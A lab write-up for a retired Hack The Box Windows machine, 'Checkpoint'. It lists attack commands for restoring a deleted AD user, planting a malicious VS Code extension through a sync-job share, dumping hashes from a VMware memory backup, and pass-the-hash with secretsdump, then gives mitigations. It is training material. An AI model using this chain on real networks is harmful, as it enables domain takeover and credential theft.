---
machine: Checkpoint
os: Windows
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [windows, active-directory, recycle-bin, vscode, vmkatz]
---

# Checkpoint — Hack The Box (Windows)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

The scenario starts with assume-breach credentials. The AD Recycle Bin restores a deleted user; their share write plants a VS Code extension installed by a sync job. BetterSuccessor and `vmkatz` on a VMware backup lead to the administrator hash.

## Reconnaissance

```bash
nmap -Pn -sCV -p88,389,445,5985,3389 <IP>
nxc smb <DC> -u <USER> -p '<PASS>'
# AD Recycle Bin
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects -Properties *
Restore-ADObject -Identity <GUID>
# Share and extension
smbclient //<HOST>/<SHARE> -U <USER>%<PASS> -c "put extension.vsix"
code --install-extension extension.vsix
# Hashes
BetterSuccessor.exe -target <USER>
vmkatz.exe -f memory.vmem
secretsdump.py -hashes :<HASH> <DOMAIN>/Administrator@<DC>
```

## Enumeration

- Valid initial credentials and AD Recycle Bin enabled.
- Writable share consumed by a sync job.
- VMware memory backup and an account allowed to read it.

## Initial access

With the initial credentials, enumerate deleted objects and restore an account. That account can write to a share; publish a `.vsix` with a malicious extension that the sync job installs and runs.

## Privilege escalation

BetterSuccessor obtains a target account NTLM hash. `vmkatz` parses the VMware memory backup and recovers the local administrator hash, reused by the domain Administrator; use it to reach the DC.

## Evidence

- User restored from AD Recycle Bin.
- Extension installed by the job and shell.
- Hash recovered with vmkatz and domain access.

## Lessons learned

- The Recycle Bin keeps old accounts and permissions.
- Sync jobs install code from shares.
- Memory backups are cleartext credentials.

## Mitigation and detection

- Audit deleted objects and their permissions.
- Restrict sync shares and sign extensions.
- Encrypt backups and limit memory read access.

## References

- [0xdf — Checkpoint](https://0xdf.gitlab.io/2026/10/24/htb-checkpoint.html)
- [Microsoft — AD Recycle Bin](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin)
- [Hack The Box — Checkpoint](https://app.hackthebox.com/machines/checkpoint)
